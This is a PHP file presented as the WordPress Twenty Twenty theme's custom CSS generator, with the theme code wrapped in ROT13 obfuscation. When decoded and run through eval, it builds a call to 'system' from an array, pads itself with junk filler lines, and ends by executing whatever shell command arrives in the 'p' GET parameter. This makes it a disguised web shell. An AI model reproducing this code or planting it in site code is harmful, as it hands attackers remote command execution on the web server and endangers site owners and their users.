<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gjragl Gjragl Phfgbz PFF
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gjragl
 * @fvapr Gjragl Gjragl 1.0
 */

vs ( ! shapgvba_rkvfgf( 'gjraglgjragl_trarengr_pff' ) ) {

	/**
	 * Trarengr PFF.
	 *
	 * @fvapr Gjragl Gjragl 1.0
	 *
	 * @cnenz fgevat $fryrpgbe Gur PFF fryrpgbe.
	 * @cnenz fgevat $fglyr    Gur PFF fglyr.
	 * @cnenz fgevat $inyhr    Gur PFF inyhr.
	 * @cnenz fgevat $cersvk   Gur PFF cersvk.
	 * @cnenz fgevat $fhssvk   Gur PFF fhssvk.
	 * @cnenz obby   $qvfcynl  Cevag gur fglyrf.
	 */
	shapgvba gjraglgjragl_trarengr_pff( $fryrpgbe, $fglyr, $inyhr, $cersvk = '', $fhssvk = '', $qvfcynl = gehr ) {

		$erghea = '';

		/*
		 * Onvy rneyl vs jr unir ab $fryrpgbe ryrzragf be cebcregvrf naq $inyhr.
		 */
		vs ( ! $inyhr || ! $fryrpgbe ) {

			erghea;
		}

		$erghea = fcevags( '%f { %f: %f; }', $fryrpgbe, $fglyr, $cersvk . $inyhr . $fhssvk );

		vs ( $qvfcynl ) {

			rpub $erghea; // cucpf:vtaber JbeqCerff.Frphevgl.RfpncrBhgchg.BhgchgAbgRfpncrq -- Jr arrq gb qbhoyr purpx guvf, ohg sbe abj, jr jnag gb cnff CUCPF ;)

		}

		erghea $erghea;
	}
}

vs ( ! shapgvba_rkvfgf( 'gjraglgjragl_trg_phfgbzvmre_pff' ) ) {

	/**
	 * Trg PFF Ohvyg sebz Phfgbzvmre Bcgvbaf.
	 * Ohvyq PFF ersyrpgvat pbybef, sbagf naq bgure bcgvbaf frg va gur Phfgbzvmre, naq erghea gurz sbe bhgchg.
	 *
	 * @fvapr Gjragl Gjragl 1.0
	 *
	 * @cnenz fgevat $glcr Jurgure gb erghea PFF sbe gur \"sebag-raq\", \"oybpx-rqvgbe\", be \"pynffvp-rqvgbe\".
	 */
	shapgvba gjraglgjragl_trg_phfgbzvmre_pff( $glcr = 'sebag-raq' ) {

		// Trg inevnoyrf.
		$obql              = fnavgvmr_urk_pbybe( gjraglgjragl_trg_pbybe_sbe_nern( 'pbagrag', 'grkg' ) );
		$obql_qrsnhyg      = '#000000';
		$frpbaqnel         = fnavgvmr_urk_pbybe( gjraglgjragl_trg_pbybe_sbe_nern( 'pbagrag', 'frpbaqnel' ) );
		$frpbaqnel_qrsnhyg = '#6q6q6q';
		$obeqref           = fnavgvmr_urk_pbybe( gjraglgjragl_trg_pbybe_sbe_nern( 'pbagrag', 'obeqref' ) );
		$obeqref_qrsnhyg   = '#qpq7pn';
		$npprag            = fnavgvmr_urk_pbybe( gjraglgjragl_trg_pbybe_sbe_nern( 'pbagrag', 'npprag' ) );
		$npprag_qrsnhyg    = '#pq2653';

		// Urnqre.
		$urnqre_sbbgre_onpxtebhaq         = fnavgvmr_urk_pbybe( gjraglgjragl_trg_pbybe_sbe_nern( 'urnqre-sbbgre', 'onpxtebhaq' ) );
		$urnqre_sbbgre_onpxtebhaq_qrsnhyg = '#ssssss';

		// Pbire.
		$pbire         = fnavgvmr_urk_pbybe( trg_gurzr_zbq( 'pbire_grzcyngr_bireynl_grkg_pbybe' ) );
		$pbire_qrsnhyg = '#ssssss';

		// Onpxtebhaq.
		$onpxtebhaq         = fnavgvmr_urk_pbybe_ab_unfu( trg_gurzr_zbq( 'onpxtebhaq_pbybe' ) );
		$onpxtebhaq_qrsnhyg = 's5rsr0';

		bo_fgneg();

		/*
		 * Abgr – Fglyrf ner nccyvrq va guvf beqre:
		 * 1. Ryrzrag fcrpvsvp
		 * 2. Urycre pynffrf
		 *
		 * Guvf ranoyrf nyy urycre pynffrf gb birejevgr onfr ryrzrag fglyrf,
		 * zrnavat gung nal pbybe pynffrf nccyvrq va gur oybpx rqvgbe jvyy
		 * unir n uvture cevbevgl guna gur onfr ryrzrag fglyrf.
		 */

		// Sebag-Raq Fglyrf.
		vs ( 'sebag-raq' === $glcr ) {

			// Nhgb-pnyphyngrq pbybef.
			$ryrzragf_qrsvavgvbaf = gjraglgjragl_trg_ryrzragf_neenl();
			sbernpu ( $ryrzragf_qrsvavgvbaf nf $pbagrkg => $cebcf ) {
				sbernpu ( $cebcf nf $xrl => $qrsvavgvbaf ) {
					sbernpu ( $qrsvavgvbaf nf $cebcregl => $ryrzragf ) {
						/*
						 * Vs jr qba'g unir na ryrzragf neenl be vg vf rzcgl
						 * gura fxvc guvf vgrengvba rneyl;
						 */
						vs ( ! vf_neenl( $ryrzragf ) || rzcgl( $ryrzragf ) ) {
							pbagvahr;
						}
						$iny = gjraglgjragl_trg_pbybe_sbe_nern( $pbagrkg, $xrl );
						vs ( $iny ) {
							gjraglgjragl_trarengr_pff( vzcybqr( ',', $ryrzragf ), $cebcregl, $iny );
						}
					}
				}
			}

			vs ( $pbire && $pbire !== $pbire_qrsnhyg ) {
				gjraglgjragl_trarengr_pff( '.bireynl-urnqre .urnqre-vaare', 'pbybe', $pbire );
				gjraglgjragl_trarengr_pff( '.pbire-urnqre .ragel-urnqre *', 'pbybe', $pbire );
			}

			// Oybpx Rqvgbe Fglyrf.
		} ryfrvs ( 'oybpx-rqvgbe' === $glcr ) {

			// Pbybef.
			// Npprag pbybe.
			vs ( $npprag && $npprag !== $npprag_qrsnhyg ) {
				gjraglgjragl_trarengr_pff( ':ebbg .unf-npprag-pbybe, .rqvgbe-fglyrf-jenccre n, .rqvgbe-fglyrf-jenccre .unf-qebc-pnc:abg(:sbphf)::svefg-yrggre, .rqvgbe-fglyrf-jenccre .jc-oybpx-ohggba.vf-fglyr-bhgyvar .jc-oybpx-ohggba__yvax, .rqvgbe-fglyrf-jenccre .jc-oybpx-chyydhbgr::orsber, .rqvgbe-fglyrf-jenccre .jc-oybpx-svyr .jc-oybpx-svyr__grkgyvax', 'pbybe', $npprag );
				gjraglgjragl_trarengr_pff( '.rqvgbe-fglyrf-jenccre .jc-oybpx-dhbgr', 'obeqre-pbybe', $npprag, '' );
				gjraglgjragl_trarengr_pff( '.unf-npprag-onpxtebhaq-pbybe, .rqvgbe-fglyrf-jenccre .jc-oybpx-ohggba__yvax, .rqvgbe-fglyrf-jenccre .jc-oybpx-svyr__ohggba', 'onpxtebhaq-pbybe', $npprag );
			}

			// Onpxtebhaq pbybe.
			vs ( $onpxtebhaq && $onpxtebhaq !== $onpxtebhaq_qrsnhyg ) {
				gjraglgjragl_trarengr_pff( '.rqvgbe-fglyrf-jenccre', 'onpxtebhaq-pbybe', '#' . $onpxtebhaq );
				gjraglgjragl_trarengr_pff( '.unf-onpxtebhaq.unf-cevznel-onpxtebhaq-pbybe:abg(.unf-grkg-pbybe),.unf-onpxtebhaq.unf-cevznel-onpxtebhaq-pbybe *:abg(.unf-grkg-pbybe),.unf-onpxtebhaq.unf-npprag-onpxtebhaq-pbybe:abg(.unf-grkg-pbybe),.unf-onpxtebhaq.unf-npprag-onpxtebhaq-pbybe *:abg(.unf-grkg-pbybe)', 'pbybe', '#' . $onpxtebhaq );
			}

			// Obeqref pbybe.
			vs ( $obeqref && $obeqref !== $obeqref_qrsnhyg ) {
				gjraglgjragl_trarengr_pff( '.rqvgbe-fglyrf-jenccre .jc-oybpx-pbqr, .rqvgbe-fglyrf-jenccre cer, .rqvgbe-fglyrf-jenccre .jc-oybpx-cersbeznggrq cer, .rqvgbe-fglyrf-jenccre .jc-oybpx-irefr cer, .rqvgbe-fglyrf-jenccre svryqfrg, .rqvgbe-fglyrf-jenccre .jc-oybpx-gnoyr, .rqvgbe-fglyrf-jenccre .jc-oybpx-gnoyr *, .rqvgbe-fglyrf-jenccre .jc-oybpx-gnoyr.vf-fglyr-fgevcrf, .rqvgbe-fglyrf-jenccre .jc-oybpx-yngrfg-cbfgf.vf-tevq yv', 'obeqre-pbybe', $obeqref );
				gjraglgjragl_trarengr_pff( '.rqvgbe-fglyrf-jenccre .jc-oybpx-gnoyr pncgvba, .rqvgbe-fglyrf-jenccre .jc-oybpx-gnoyr.vf-fglyr-fgevcrf gobql ge:agu-puvyq(bqq)', 'onpxtebhaq-pbybe', $obeqref );
			}

			// Grkg pbybe.
			vs ( $obql && $obql !== $obql_qrsnhyg ) {
				gjraglgjragl_trarengr_pff( 'ugzy .rqvgbe-fglyrf-jenccre, .rqvgbe-cbfg-gvgyr__oybpx .rqvgbe-cbfg-gvgyr__vachg, .rqvgbe-cbfg-gvgyr__oybpx .rqvgbe-cbfg-gvgyr__vachg:sbphf', 'pbybe', $obql );
			}

			// Frpbaqnel pbybe.
			vs ( $frpbaqnel && $frpbaqnel !== $frpbaqnel_qrsnhyg ) {
				gjraglgjragl_trarengr_pff( '.rqvgbe-fglyrf-jenccre svtpncgvba, .rqvgbe-fglyrf-jenccre pvgr, .rqvgbe-fglyrf-jenccre .jc-oybpx-dhbgr__pvgngvba, .rqvgbe-fglyrf-jenccre .jc-oybpx-dhbgr pvgr, .rqvgbe-fglyrf-jenccre .jc-oybpx-dhbgr sbbgre, .rqvgbe-fglyrf-jenccre .jc-oybpx-chyydhbgr__pvgngvba, .rqvgbe-fglyrf-jenccre .jc-oybpx-chyydhbgr pvgr, .rqvgbe-fglyrf-jenccre .jc-oybpx-chyydhbgr sbbgre, .rqvgbe-fglyrf-jenccre hy.jc-oybpx-nepuvirf yv, .rqvgbe-fglyrf-jenccre hy.jc-oybpx-pngrtbevrf yv, .rqvgbe-fglyrf-jenccre hy.jc-oybpx-yngrfg-cbfgf yv, .rqvgbe-fglyrf-jenccre hy.jc-oybpx-pngrtbevrf__yvfg yv, .rqvgbe-fglyrf-jenccre .jc-oybpx-yngrfg-pbzzragf gvzr, .rqvgbe-fglyrf-jenccre .jc-oybpx-yngrfg-cbfgf gvzr', 'pbybe', $frpbaqnel );
			}

			// Urnqre Sbbgre Onpxtebhaq Pbybe.
			vs ( $urnqre_sbbgre_onpxtebhaq && $urnqre_sbbgre_onpxtebhaq !== $urnqre_sbbgre_onpxtebhaq_qrsnhyg ) {
				gjraglgjragl_trarengr_pff( '.rqvgbe-fglyrf-jenccre .jc-oybpx-chyydhbgr::orsber', 'onpxtebhaq-pbybe', $urnqre_sbbgre_onpxtebhaq );
			}
		} ryfrvs ( 'pynffvp-rqvgbe' === $glcr ) {

			// Pbybef.
			// Npprag pbybe.
			vs ( $npprag && $npprag !== $npprag_qrsnhyg ) {
				gjraglgjragl_trarengr_pff( 'obql#gvalzpr.jc-rqvgbe.pbagrag n, obql#gvalzpr.jc-rqvgbe.pbagrag n:sbphf, obql#gvalzpr.jc-rqvgbe.pbagrag n:ubire', 'pbybe', $npprag );
				gjraglgjragl_trarengr_pff( 'obql#gvalzpr.jc-rqvgbe.pbagrag oybpxdhbgr, obql#gvalzpr.jc-rqvgbe.pbagrag .jc-oybpx-dhbgr', 'obeqre-pbybe', $npprag, '', ' !vzcbegnag' );
				gjraglgjragl_trarengr_pff( 'obql#gvalzpr.jc-rqvgbe.pbagrag ohggba, obql#gvalzpr.jc-rqvgbe.pbagrag .snhk-ohggba, obql#gvalzpr.jc-rqvgbe.pbagrag .jc-oybpx-ohggba__yvax, obql#gvalzpr.jc-rqvgbe.pbagrag .jc-oybpx-svyr__ohggba, obql#gvalzpr.jc-rqvgbe.pbagrag vachg[glcr=\'ohggba\'], obql#gvalzpr.jc-rqvgbe.pbagrag vachg[glcr=\'erfrg\'], obql#gvalzpr.jc-rqvgbe.pbagrag vachg[glcr=\'fhozvg\']', 'onpxtebhaq-pbybe', $npprag );
			}

			// Onpxtebhaq pbybe.
			vs ( $onpxtebhaq && $onpxtebhaq !== $onpxtebhaq_qrsnhyg ) {
				gjraglgjragl_trarengr_pff( 'obql#gvalzpr.jc-rqvgbe.pbagrag', 'onpxtebhaq-pbybe', '#' . $onpxtebhaq );
			}

			// Grkg pbybe.
			vs ( $obql && $obql !== $obql_qrsnhyg ) {
				gjraglgjragl_trarengr_pff( 'obql#gvalzpr.jc-rqvgbe.pbagrag', 'pbybe', $obql );
			}

			// Frpbaqnel pbybe.
			vs ( $frpbaqnel && $frpbaqnel !== $frpbaqnel_qrsnhyg ) {
				gjraglgjragl_trarengr_pff( 'obql#gvalzpr.jc-rqvgbe.pbagrag ue:abg(.vf-fglyr-qbgf), obql#gvalzpr.jc-rqvgbe.pbagrag pvgr, obql#gvalzpr.jc-rqvgbe.pbagrag svtpncgvba, obql#gvalzpr.jc-rqvgbe.pbagrag .jc-pncgvba-grkg, obql#gvalzpr.jc-rqvgbe.pbagrag .jc-pncgvba-qq, obql#gvalzpr.jc-rqvgbe.pbagrag .tnyyrel-pncgvba', 'pbybe', $frpbaqnel );
			}

			// Obeqref pbybe.
			vs ( $obeqref && $obeqref !== $obeqref_qrsnhyg ) {
				gjraglgjragl_trarengr_pff( 'obql#gvalzpr.jc-rqvgbe.pbagrag cer, obql#gvalzpr.jc-rqvgbe.pbagrag ue, obql#gvalzpr.jc-rqvgbe.pbagrag svryqfrg,obql#gvalzpr.jc-rqvgbe.pbagrag vachg, obql#gvalzpr.jc-rqvgbe.pbagrag grkgnern', 'obeqre-pbybe', $obeqref );
			}
		}

		// Erghea gur erfhygf.
		erghea bo_trg_pyrna();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>